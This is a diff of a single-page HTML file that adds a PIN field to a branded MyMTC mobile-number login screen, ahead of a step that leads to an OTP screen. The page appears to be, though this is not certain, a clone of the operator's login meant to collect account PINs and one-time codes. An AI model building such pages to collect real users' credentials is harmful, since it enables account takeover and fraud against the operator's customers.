@@ -80,8 +80,18 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 </div>
 <div class="screen" id="step3">
 <h1>Welcome to MyMTC</h1>
-<p class="sub">Enter your MTC mobile number to continue</p>
-<div style="margin-top:24px;max-width:420px"><label class="label">MTC Mobile Number</label><div class="prefix"><div class="pre">+264</div><input id="loginPhone" class="input" style="flex:1" placeholder="81 XXX XXXX"></div></div>
+<p class="sub">Enter your MTC mobile number and PIN to continue</p>
+<div style="margin-top:24px;max-width:420px">
+<label class="label">MTC Mobile Number</label>
+<div class="prefix"><div class="pre">+264</div><input id="loginPhone" class="input" placeholder="81 XXX XXXX"></div>
+
+<label class="label" style="margin-top:20px">MyMTC PIN</label>
+<div class="pin-wrap">
+<input id="loginPin" type="password" class="input" placeholder="Enter 4-digit PIN" maxlength="6" inputmode="numeric">
+<span class="pin-toggle" onclick="togglePin()">Show</span>
+</div>
+<p class="small" style="text-align:left"><a href="#">Forgot PIN?</a></p>
+</div>
 <button class="btn" onclick="goToOTP()">Continue</button>
 <p class="small">By continuing you agree to our <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a></p>
 </div>
